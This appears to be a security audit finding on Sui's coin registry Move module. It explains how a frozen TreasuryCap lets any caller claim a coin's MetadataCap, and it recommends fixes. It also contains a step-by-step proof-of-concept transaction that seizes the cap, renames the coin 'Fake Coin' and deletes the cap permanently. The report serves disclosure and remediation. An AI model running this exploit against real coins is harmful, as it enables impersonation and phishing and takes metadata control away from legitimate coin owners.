### Title
Frozen `TreasuryCap` Bypasses Ownership Check in `claim_metadata_cap`, Allowing Any Caller to Seize and Corrupt Coin Metadata — (File: `crates/sui-framework/packages/sui-framework/sources/registries/coin_registry.move`)

---

### Summary

`coin_registry::claim_metadata_cap` uses `&TreasuryCap<T>` (an immutable reference) as its sole proof of ownership. In Sui's object model, frozen (immutable) objects can be supplied as immutable inputs by **any** address without owning them. Many fixed-supply coins freeze their `TreasuryCap` to prevent minting. For every such coin, an unprivileged caller can claim the `MetadataCap<T>`, corrupt the coin's on-chain metadata, and permanently delete the cap so the legitimate owner can never reclaim it.

---

### Finding Description

`claim_metadata_cap` is documented as "Only allowed from the owner of `TreasuryCap`, and only once." [1](#0-0) 

The implementation:

```move
public fun claim_metadata_cap<T>(
    currency: &mut Currency<T>,
    _: &TreasuryCap<T>,   // ← immutable reference, not ownership proof
    ctx: &mut TxContext,
): MetadataCap<T> {
    assert!(!currency.is_metadata_cap_claimed(), EMetadataCapAlreadyClaimed);
    let id = object::new(ctx);
    currency.metadata_cap_id = MetadataCapState::Claimed(id.to_inner());
    MetadataCap { id }
}
```

The `_: &TreasuryCap<T>` parameter is an immutable reference. Sui's transaction-input validation enforces that **owned** objects may only be supplied by their owner, but **frozen** (immutable) objects may be supplied by anyone as `ImmOrOwnedObject` inputs. [2](#0-1) 

A coin whose `TreasuryCap` has been frozen (the standard pattern for fixed-supply coins) therefore has no ownership barrier on `claim_metadata_cap`. The function never inspects `ctx.sender()` or the object's `Owner` field.

The `Currency<T>` shared object is created with `metadata_cap_id: MetadataCapState::Unclaimed` by the permissionless `migrate_legacy_metadata` function: [3](#0-2) [4](#0-3) 

Because `migrate_legacy_metadata` is public and permissionless (takes only `&CoinMetadata<T>`, itself typically frozen), an attacker can both trigger the migration and immediately claim the cap in the same PTB.

After claiming, the attacker holds a live `MetadataCap<T>` and can:

- Call `set_name`, `set_description`, `set_icon_url` to overwrite the coin's on-chain display metadata.
- Call `delete_metadata_cap` to permanently set `metadata_cap_id = MetadataCapState::Deleted`, making it impossible for the legitimate owner to ever claim or use the cap. [5](#0-4) [6](#0-5) 

---

### Impact Explanation

An unprivileged caller can:

1. Corrupt the `name`, `description`, and `icon_url` fields of any coin whose `TreasuryCap` is frozen — fields that wallets, explorers, and DeFi UIs display to users, creating a phishing/impersonation vector.
2. Permanently destroy the `MetadataCap`, making the `Deleted` state irreversible and denying the legitimate coin creator any future ability to update their coin's metadata.

This constitutes **harmful smart-contract behavior** (unauthorized state mutation on a shared system object) and a **permanent DoS** of the metadata-management capability for affected coins.

---

### Likelihood Explanation

- Freezing the `TreasuryCap` is the standard pattern for fixed-supply coins (`transfer::public_freeze_object(treasury_cap)`), so a large class of real coins is affected.
- `migrate_legacy_metadata` is public and permissionless; the attacker does not need the coin creator's cooperation.
- The entire attack fits in a single PTB with two Move calls and no special privileges.
- The `CoinRegistry` at `0xc` is a live system shared object; the `Currency<T>` shared objects created by migration are immediately accessible.

---

### Recommendation

Replace the immutable-reference witness with a check that enforces actual ownership. Two options:

**Option A** — Require the `TreasuryCap` by value (only the owner can move an owned object):
```move
public fun claim_metadata_cap<T>(
    currency: &mut Currency<T>,
    cap: TreasuryCap<T>,   // by value: only the owner can supply this
    ctx: &mut TxContext,
): (MetadataCap<T>, TreasuryCap<T>) { ... }
```

**Option B** — Explicitly verify `ctx.sender()` matches the recorded `treasury_cap_id` owner (requires storing the owner address at registration time).

The root fix is to ensure that the ownership proof cannot be satisfied by a frozen object that any caller can reference.

---

### Proof of Concept

```
// Step 1 – permissionless migration (attacker is tx sender)
PTB {
  Input(0): SharedObject { id: 0xc, ... }          // CoinRegistry (mutable)
  Input(1): ImmOrOwnedObject(frozen_coin_metadata)  // CoinMetadata<T> (frozen, anyone can use)
  Input(2): ImmOrOwnedObject(frozen_treasury_cap)   // TreasuryCap<T>  (frozen, anyone can use)

  // Creates Currency<T> with metadata_cap_id = Unclaimed
  Result(0) = MoveCall(0x2::coin_registry::migrate_legacy_metadata<T>,
                       [Input(0), Input(1)])

  // Attacker claims MetadataCap using the frozen TreasuryCap as witness
  Result(1) = MoveCall(0x2::coin_registry::claim_metadata_cap<T>,
                       [shared_currency_obj, Input(2)])

  // Corrupt the coin name
  MoveCall(0x2::coin_registry::set_name<T>,
           [shared_currency_obj, Result(1), "Fake Coin"])

  // Permanently delete the cap so the real owner can never reclaim it
  MoveCall(0x2::coin_registry::delete_metadata_cap<T>,
           [shared_currency_obj, Result(1)])
}
```

After this transaction, `Currency<T>.metadata_cap_id == MetadataCapState::Deleted` and the coin's `name` field is permanently corrupted. The legitimate coin creator has no recourse.

```text
/// Internal macro to keep implementation between build and test modes.
macro fun migrate_legacy_metadata_impl<$T>(
    $registry: &mut CoinRegistry,
    $legacy: &CoinMetadata<$T>,
): Currency<$T> {
    let registry = $registry;
    let legacy = $legacy;

    assert!(!registry.exists<$T>(), ECurrencyAlreadyRegistered);
    assert!(is_ascii_printable!(&legacy.get_symbol().to_string()), EInvalidSymbol);

    Currency<$T> {
        id: derived_object::claim(&mut registry.id, CurrencyKey<$T>()),
        decimals: legacy.get_decimals(),
        name: legacy.get_name(),
        symbol: legacy.get_symbol().to_string(),
        description: legacy.get_description(),
        icon_url: legacy
            .get_icon_url()
            .map!(|url| url.inner_url().to_string())
            .destroy_or!(b"".to_string()),
        supply: option::some(SupplyState::Unknown),
        regulated: RegulatedState::Unknown,
        treasury_cap_id: option::none(),
        metadata_cap_id: MetadataCapState::Unclaimed,
        extra_fields: vec_map::empty(),
    }
```
